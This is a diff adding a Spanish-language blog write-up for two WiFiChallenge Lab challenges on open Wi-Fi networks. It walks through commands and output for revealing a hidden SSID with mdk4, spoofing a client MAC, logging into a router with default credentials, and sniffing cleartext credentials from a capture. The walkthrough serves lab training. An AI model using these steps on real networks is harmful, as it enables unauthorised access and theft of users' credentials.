@@ -1,0 +1,196 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WifiChallengeLab - Wi-Fi - OPN (Redes Públicas Abiertas) · MiguelRega7</title>
+<meta name="description" content="Red inalámbrica que no tiene cifrado ni contraseña para conectarse. WiFiChallenge Lab - Challenge 5 - ¿Cuál es la FLAG en el router del AP oculto tras unas credenciales por defecto"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Wi-Fi</span><h1>WifiChallengeLab - Wi-Fi - OPN (Redes Públicas Abiertas)</h1><div class="meta"><span>◷</span><time>2025-08-10</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">Red inalámbrica que no tiene cifrado ni contraseña para conectarse. WiFiChallenge Lab - Challenge 5 - ¿Cuál es la FLAG en el router del AP oculto tras unas credenciales por defecto.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#wifichallenge-lab-challenge-5-cu-l-es-la-flag-en-el-router-del-ap-oculto-tras-unas-credenciales-por-defecto">WiFiChallenge Lab - Challenge 5 - ¿Cuál es la FLAG en el router del AP oculto tras unas credenciales por defecto?</a><a href="#wifichallenge-lab-challenge-6-cu-l-es-la-flag-en-el-router-ap-de-la-red-wifi-guest">WiFiChallenge Lab - Challenge 6 - ¿Cuál es la FLAG en el router AP de la red wifi-guest?</a></aside><article class="article-content" id="top"><blockquote>
+<p>Red inalámbrica que no tiene cifrado ni contraseña para conectarse.</p>
+</blockquote>
+<h2 id="wifichallenge-lab-challenge-5-cu-l-es-la-flag-en-el-router-del-ap-oculto-tras-unas-credenciales-por-defecto">WiFiChallenge Lab - Challenge 5 - ¿Cuál es la FLAG en el router del AP oculto tras unas credenciales por defecto?</h2>
+<ul>
+<li>Primero vamos a identificar la red Oculta.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# airodump-ng wlan0mon --band abg
+</code></pre></div></div>
+<ul>
+<li>Si observamos vemos que la red es oculta.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/EG761Rv.png">
+</p>
+
+<ul>
+<li>Vamos a ver como se llama haciendo un ataque de fuerza bruta usando <strong>MDK4</strong> <a href="https://www.kali.org/tools/mdk4/">https://www.kali.org/tools/mdk4/</a> es una herramienta de auditoría y pruebas de redes inalámbricas. Es una evolución de MDK3 y está diseñada para atacar redes Wi-Fi de diversas maneras, explotando vulnerabilidades y debilidades en la seguridad de estas redes. MDK4 puede realizar una amplia variedad de ataques, incluidos ataques de denegación de servicio (DoS), ataques de desautenticación, ataques de reinyección de paquetes y muchos otros.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# iwconfig wlan0mon channel 11
+</code></pre></div></div>
+<ul>
+<li>Una vez operando en la antena en el canal donde esta el AP oculto vamos a proceder a hacer el ataque de fuerza bruta con el diccionario que tenemos en el laboratorio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt 
+Waiting for a beacon frame from target to get its SSID length.
+SSID length is 9
+Trying SSID: wifi-love                                           
+Packets sent:      1 - Speed:    1 packets/sec
+Probe Response from target AP with SSID wifi-*****                
+Job's done, have a nice day :)
+</code></pre></div></div>
+<ul>
+<li>Como es una red abierta y ya tenemos el nombre simplemente podemos conectarnos y obtener IP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# cat zi.conf 
+network={
+    ssid=&quot;wifi-****&quot;
+    key_mgmt=NONE
+    scan_ssid=1
+}
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# wpa_supplicant -iwlan2 -c zi.conf 
+Successfully initialized wpa_supplicant
+wlan2: SME: Trying to authenticate with f0:9f:c2:6a:88:26 (SSID='wifi-****' freq=2462 MHz)
+wlan2: Trying to associate with f0:9f:c2:6a:88:26 (SSID='wifi-****' freq=2462 MHz)
+wlan2: Associated with f0:9f:c2:6a:88:26
+wlan2: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:6a:88:26 completed [id=0 id_str=]
+</code></pre></div></div>
+<ul>
+<li>Ahora obtenemos IP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# dhclient wlan2 -v
+Internet Systems Consortium DHCP Client 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan2/02:00:00:00:02:00
+Sending on   LPF/wlan2/02:00:00:00:02:00
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0x63f8fc4b)
+DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 6 (xid=0x63f8fc4b)
+DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 15 (xid=0x63f8fc4b)
+DHCPOFFER of 192.168.16.84 from 192.168.16.1
+DHCPREQUEST for 192.168.16.84 on wlan2 to 255.255.255.255 port 67 (xid=0x4bfcf863)
+DHCPACK of 192.168.16.84 from 192.168.16.1 (xid=0x63f8fc4b)
+bound to 192.168.16.84 -- renewal in 41788 seconds.
+</code></pre></div></div>
+<ul>
+<li>Ahora nos vamos al navegador para ver el sitio web.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/eh99OYj.png">
+</p>
+
+<ul>
+<li>Si recordamos nos decian que las credenciales son por defecto si intentamos con admin:admin que es lo mas comun vemos que nos deja entrar y obtenemos la flag del reto.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/b93ISXY.png">
+</p>
+
+<h2 id="wifichallenge-lab-challenge-6-cu-l-es-la-flag-en-el-router-ap-de-la-red-wifi-guest">WiFiChallenge Lab - Challenge 6 - ¿Cuál es la FLAG en el router AP de la red wifi-guest?</h2>
+<ul>
+<li>Tenemos cliente conectados al AP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# airodump-ng wlan0mon --band abg -c6 -w capturaopn
+</code></pre></div></div>
+<p align="center">
+<img src="https://i.imgur.com/oRE5hb7.png">
+</p>
+
+<ul>
+<li>Al ser una red abierta podemos suplantar la MAC de un cliente y conectarnos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# sudo systemctl stop NetworkManager
+root@WiFiChallengeLab:/home/user# ip link set wlan2 down
+root@WiFiChallengeLab:/home/user# macchanger -m B0:72:BF:44:B0:49 wlan2
+Current MAC:   b0:72:bf:44:b0:49 (unknown)
+Permanent MAC: 02:00:00:00:02:00 (unknown)
+New MAC:       b0:72:bf:44:b0:49 (unknown)
+It's the same MAC!!
+</code></pre></div></div>
+<ul>
+<li>Ahora creamos el archivo de configuración.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# cat zi.conf 
+network={
+    ssid=&quot;wifi-guest&quot;
+    key_mgmt=NONE
+    scan_ssid=1
+}
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# wpa_supplicant -iwlan2 -c zi.conf 
+Successfully initialized wpa_supplicant
+wlan2: SME: Trying to authenticate with f0:9f:c2:71:22:10 (SSID='wifi-guest' freq=2437 MHz)
+wlan2: Trying to associate with f0:9f:c2:71:22:10 (SSID='wifi-guest' freq=2437 MHz)
+wlan2: Associated with f0:9f:c2:71:22:10
+wlan2: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:71:22:10 completed [id=0 id_str=]
+wlan2: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+</code></pre></div></div>
+<ul>
+<li>Ahora nos asignamos IP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# dhclient wlan2 -v
+Internet Systems Consortium DHCP Client 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan2/b0:72:bf:44:b0:49
+Sending on   LPF/wlan2/b0:72:bf:44:b0:49
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0xacf3240)
+DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 7 (xid=0xacf3240)
+DHCPOFFER of 192.168.10.14 from 192.168.10.1
+DHCPREQUEST for 192.168.10.14 on wlan2 to 255.255.255.255 port 67 (xid=0x4032cf0a)
+DHCPACK of 192.168.10.14 from 192.168.10.1 (xid=0xacf3240)
+bound to 192.168.10.14 -- renewal in 38293 seconds.
+</code></pre></div></div>
+<ul>
+<li>Pero vemos que es un panel de autenticación y no tenemos credenciales.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/7PuOkhl.png">
+</p>
+
+<ul>
+<li><p>Como no tenemos credenciales pero estamos ante una red publica vamos a examinar nuestra captura .cap que exportamos mientras escaneamos para ver si viajo alguna credencial cuando estabamos monitoreando.</p>
+</li>
+<li><p>Vemos una credencial si filtramos por trafico <strong>http</strong>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/mSZByth.png">
+</p>
+
+<ul>
+<li>Vemos que funcionan y vemos la flag.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/xvlfoeU.png">
+</p>
+
+<blockquote>
+<p>Las redes OPN no cifran el tráfico entre el dispositivo del usuario y el punto de acceso. Esto permite a los atacantes espiar el tráfico de la red para capturar datos no cifrados, como nombres de usuario, contraseñas y actividad de navegación.</p>
+</blockquote>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
